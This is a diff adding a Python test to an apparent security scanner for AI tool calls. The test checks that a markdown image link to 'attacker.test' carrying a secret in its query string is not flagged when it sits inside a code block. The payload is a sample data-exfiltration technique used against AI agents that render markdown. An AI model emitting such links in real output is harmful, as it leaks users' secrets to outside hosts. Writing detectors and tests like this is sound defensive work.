@@ -363,6 +363,17 @@ def test_classic_mcp_handler_safe_negatives() -> None:
     assert "classic.xxe_argument" not in safe_xml_docs
 
 
+def test_markdown_code_block_does_not_create_active_tracking_pixel() -> None:
+    ids = _ids(
+        _scan_tool(
+            "render_markdown",
+            {"content": "```md\n![bad](https://attacker.test/pixel?d=SECRET)\n```"},
+        )
+    )
+
+    assert "exfil.markdown_tracking_pixel" not in ids
+
+
 def test_mcp_context_graph_resource_schema_and_output_signals() -> None:
     resource_ids = _ids(
         _scan_tool(
